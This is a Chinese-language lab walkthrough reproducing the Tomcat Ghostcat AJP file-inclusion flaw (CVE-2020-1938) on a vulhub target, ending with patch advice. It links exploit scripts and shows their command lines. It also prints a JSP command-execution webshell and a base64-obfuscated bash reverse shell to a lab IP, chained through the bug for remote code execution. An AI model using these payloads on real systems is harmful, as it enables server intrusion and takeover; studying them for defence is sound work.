# Aapache Tomcat AJP文件包含漏洞（CVE-2020-1938）

### 0x00 前言

Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

影响版本：

```
Apache Tomcat 6
Apache Tomcat 7 < 7.0.100
Apache Tomcat 8 < 8.5.51
Apache Tomcat 9 < 9.0.31
```

### 0x01 环境搭建

这里使用vulhub搭建靶场环境`tomcat/CVE-2020-1938`

![image-20230410153328550](https://user-images.githubusercontent.com/122008722/230865459-0e9b51dc-c470-46b7-8319-1e36dcefebdf.png)

### 0x02 POC/EXP

cve_2020_1938_exp.py: `https://github.com/lcyunkong/pochub/blob/main/pochub/poc_list/web/Tomcat/cve_2020_1938_exp.py`

```python
# 利用：
# 在代码最后传入目标url即可，实例：
vuln_exploit_start("http://192.168.12.130:8080")
```

### 0x02 复现步骤

1、准备POC`https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py`

2、POC需要python2环境启动

```shell
python2 tomcat_AJP_Arbitrary_file_read_include.py 目标IP或HOST -p 目标端口 -f 文件路径
```

![image-20230410160311933](https://user-images.githubusercontent.com/122008722/230865483-2457df82-565d-4ed7-8db1-87f71d11ab0f.png)

3、由于靶场没有文件上传漏洞利用点，我们手动为靶场上传shell文件，内容如下：

```jsp
# 有回显版本
<%
java.io.InputStream in = Runtime.getRuntime().exec("需要执行的命令").getInputStream();
int a = -1;
byte[] b = new byte[2048];
out.print("<pre>");
while((a=in.read(b))!=-1){
out.println(new String(b));
}
out.print("</pre>");
%>


# 无回显版本
<%
Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}")
%>
```

```shell
docker cp shell.txt 29b32:/usr/local/tomcat/webapps/ROOT/
```

![image-20230410161431354](https://user-images.githubusercontent.com/122008722/230865520-3140c91b-cd10-4849-8efd-a6036f0656bc.png)

4、利用脚本进行反弹shell

修改poc，添加后缀`.jsp`

![image-20230410161748863](https://user-images.githubusercontent.com/122008722/230865535-9e7ae3ef-7e07-476a-b4f5-97dce15f372a.png)

```shell
python2 tomcat_AJP_Arbitrary_file_read_include.py 192.168.12.130 -p 8009 -f /WEB-INF/shell.txt
```

![image-20230410163038478](https://user-images.githubusercontent.com/122008722/230865592-b3857f4d-3bca-4d94-8218-73a0a5c126f1.png)

### 0x03 修复建议

1、关闭AJP 协议的端口

2、更新官方最新补丁
